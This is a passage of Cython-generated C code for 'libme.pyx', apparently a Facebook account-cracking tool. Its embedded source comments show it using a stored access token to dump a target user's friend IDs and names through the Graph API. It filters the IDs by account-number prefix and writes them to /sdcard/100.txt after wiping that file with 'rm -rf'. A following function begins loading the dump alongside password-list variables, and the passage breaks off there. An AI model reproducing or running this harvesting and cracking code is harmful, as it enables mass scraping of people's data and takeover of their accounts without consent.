          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 649, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":650
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v___file);
        __Pyx_GIVEREF(__pyx_v___file);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v___file);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 650, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":651
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 651, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":652
 * 				file = open(__file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 652, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 652, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 652, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 652, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 652, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 652, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":653
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_GetSlice(__pyx_t_4, 0, 6, NULL, NULL, &__pyx_slice__37, 0, 1, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 653, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100074, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 653, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100075, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 653, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100076, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 653, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100078, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 653, __pyx_L21_error)
          __pyx_t_14 = __pyx_t_15;
          __pyx_L32_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_15 = (__pyx_t_14 != 0);
          if (__pyx_t_15) {

            /* "libme.pyx":654
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 */
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 654, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 654, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 654, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 654, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 654, __pyx_L21_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":655
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except(KeyError , IOError):
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 */
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_17 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_18 = PyNumber_Add(__pyx_t_17, __pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__39); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __pyx_t_18 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_5 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_18, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_4);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":653
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          }

          /* "libme.pyx":652
 * 				file = open(__file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":647
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":656
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__10007__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_8) < 0) __PYX_ERR(0, 656, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_8);

        /* "libme.pyx":657
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":647
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":644
 * 		os.system("rm -rf /sdcard/100.txt")
 * 		__file = ("/sdcard/100.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":658
 * 			except(KeyError , IOError):
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(__file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 658, __pyx_L1_error) }
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 658, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 658, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":659
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 */
  __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 659, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_INCREF(__pyx_v___file);
  __Pyx_GIVEREF(__pyx_v___file);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v___file);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 659, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 659, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":660
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 660, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 660, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 660, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 660, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":661
 * 		__id=open(__file, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))             # <<<<<<<<<<<<<<
 * 	def __10000__(self):
 * 		try:
 */
  __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_Dump_Files_Saved_In_s, __pyx_v___file); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":633
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()
 * 	def __10007__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("libme.James.__10007__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v___file);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":662
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_43__10000__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_43__10000__ = {"__10000__", (PyCFunction)__pyx_pw_5libme_5James_43__10000__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_43__10000__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__10000__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_42__10000__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_42__10000__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__10000__", 0);

  /* "libme.pyx":663
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":664
 * 	def __10000__(self):
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_100_txt);
      __pyx_v_file = __pyx_kp_s_storage_emulated_0_100_txt;

      /* "libme.pyx":665
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_file);
      __Pyx_GIVEREF(__pyx_v_file);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_file);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 665, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
